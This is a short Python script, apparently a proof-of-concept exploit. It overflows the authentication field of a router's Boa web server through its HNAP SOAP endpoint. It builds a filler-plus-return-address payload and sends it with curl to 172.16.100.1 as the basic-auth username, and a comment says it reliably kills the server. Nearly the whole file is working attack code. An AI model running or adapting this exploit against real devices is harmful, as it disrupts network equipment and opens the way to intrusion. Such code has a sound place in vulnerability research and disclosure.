#!/usr/bin/env python
from os import system
from os import environ
import struct

def assemble_payload():
    '''Assemble the complete payload.'''

    # Filler data
    garbage = struct.pack('>c', 'A')

    # Return address
    # 0x80000000 - 0x7ff0 reliably kills Boa without crashing the device
    ret = struct.pack('>L', 0x7f805001)

    # Payload = (garbage(108) + return_addr(4)) = 112
    payload = ''
    for i in range(107):
        payload += garbage
    payload += ret

    return payload


if __name__ == "__main__":

    # Create the payload blob
    payload_obj = assemble_payload()
    print "Total payload length: %d" % len(payload_obj)

    # Save the payload to an environment variable
    environ["PAYLOAD"] = payload_obj

    # Execute curl to send the payload
    system("curl -vv -u admin:$PAYLOAD \
            --header \"content-type: text/soap+xml; charset=utf-8\" \
            --data @soap.xml http://172.16.100.1/HNAP")

    # Send an extra request to ensure the connection is still up
    system("curl -vv http://172.16.100.1/Tools")

